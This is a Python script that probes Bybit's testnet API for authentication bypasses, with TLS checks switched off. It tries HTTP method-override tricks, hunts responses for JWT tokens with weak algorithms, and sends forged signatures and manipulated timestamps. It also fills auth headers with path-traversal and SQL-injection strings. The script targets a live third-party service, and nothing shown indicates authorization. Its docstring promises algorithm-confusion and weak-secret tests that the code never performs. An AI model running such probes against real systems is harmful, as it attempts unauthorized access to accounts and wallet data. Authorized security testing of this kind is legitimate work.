#!/usr/bin/env python3
"""
Test JWT vulnerabilities:
- Algorithm confusion (RS256 -> HS256)
- None algorithm
- Weak secret
- X-HTTP-Method-Override bypass
"""
import requests
import base64
import json

requests.packages.urllib3.disable_warnings()

api = "https://api-testnet.bybit.com"

print("="*80)
print("TESTING JWT AUTHENTICATION BYPASS")
print("="*80)

# Test 1: HTTP Method Override for auth bypass
print("\n[1] TESTING X-HTTP-Method-Override BYPASS")
print("-"*80)

protected_endpoints = [
    "/v5/user/query-api",
    "/v5/account/wallet-balance",
    "/v5/position/list",
]

for endpoint in protected_endpoints:
    # Try without auth
    r1 = requests.get(api + endpoint, timeout=5, verify=False)
    
    # Try with X-HTTP-Method-Override
    headers = {
        "X-HTTP-Method-Override": "GET",
        "X-Original-Method": "OPTIONS"
    }
    r2 = requests.options(api + endpoint, headers=headers, timeout=5, verify=False)
    
    if r1.status_code != r2.status_code:
        print(f"\n⚠️  {endpoint}")
        print(f"  GET: {r1.status_code}")
        print(f"  OPTIONS + Override: {r2.status_code}")
        if r2.status_code == 200:
            print(f"  🚨 POSSIBLE BYPASS! Response: {r2.text[:200]}")

# Test 2: Try to find JWT tokens in responses
print("\n\n[2] LOOKING FOR JWT TOKENS IN RESPONSES")
print("-"*80)

test_endpoints = [
    "/v5/market/tickers?category=spot&symbol=BTCUSDT",
    "/v5/announcements/index?locale=en-US&limit=1",
]

for endpoint in test_endpoints:
    r = requests.get(api + endpoint, timeout=5, verify=False)
    
    # Look for JWT pattern (xxx.yyy.zzz)
    import re
    jwt_pattern = r'[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    matches = re.findall(jwt_pattern, r.text)
    
    if matches:
        for match in matches[:3]:
            # Check if it looks like JWT
            parts = match.split('.')
            if len(parts) == 3:
                try:
                    # Try to decode header
                    header = json.loads(base64.b64decode(parts[0] + '=='))
                    print(f"\n✓ Found JWT in {endpoint}")
                    print(f"  Header: {header}")
                    print(f"  Token: {match[:50]}...")
                    
                    # Check algorithm
                    alg = header.get('alg', '')
                    if alg == 'none':
                        print(f"  🚨 CRITICAL: Algorithm is 'none'!")
                    elif alg == 'HS256':
                        print(f"  ⚠️  Using HS256 - might be vulnerable to key confusion")
                        
                except:
                    pass

# Test 3: API Signature bypass attempts
print("\n\n[3] TESTING API SIGNATURE BYPASS")
print("-"*80)

# Try various timestamp manipulations
bypass_attempts = [
    {"timestamp": "0"},
    {"timestamp": "9999999999999"},
    {"timestamp": "-1"},
    {"timestamp": ""},
    {"recv_window": "999999999"},
]

test_endpoint = "/v5/account/wallet-balance"

for params in bypass_attempts:
    headers = {
        "X-BAPI-API-KEY": "test",
        "X-BAPI-SIGN": "test",
        "X-BAPI-TIMESTAMP": params.get("timestamp", "1234567890000"),
        "X-BAPI-RECV-WINDOW": params.get("recv_window", "5000")
    }
    
    try:
        r = requests.get(api + test_endpoint, headers=headers, timeout=5, verify=False)
        
        if r.status_code == 200:
            data = r.json()
            ret_code = data.get('retCode', 0)
            
            # Check if we got different error
            if ret_code not in [10003, 10001, 10002]:
                print(f"\n⚠️  Unusual error code with {params}")
                print(f"  Code: {ret_code}, Message: {data.get('retMsg', '')}")
                
    except:
        pass

# Test 4: Try to access with malformed auth headers
print("\n\n[4] TESTING MALFORMED AUTH HEADERS")
print("-"*80)

malformed_tests = [
    {"X-BAPI-API-KEY": "../../../etc/passwd"},
    {"X-BAPI-API-KEY": "' OR '1'='1"},
    {"X-BAPI-API-KEY": "null"},
    {"X-BAPI-API-KEY": "undefined"},
    {"X-BAPI-SIGN": "' OR '1'='1'--"},
]

for headers in malformed_tests:
    headers.update({
        "X-BAPI-TIMESTAMP": "1234567890000",
        "X-BAPI-RECV-WINDOW": "5000"
    })
    
    try:
        r = requests.get(api + test_endpoint, headers=headers, timeout=5, verify=False)
        
        # Check for SQL errors or different behavior
        if any(x in r.text.lower() for x in ['sql', 'syntax', 'error:', 'exception']):
            print(f"\n🚨 ERROR DISCLOSURE with {headers}")
            print(f"  Response: {r.text[:300]}")
            
    except:
        pass

print("\n" + "="*80)
print("JWT/AUTH BYPASS TESTING COMPLETE")
print("="*80)
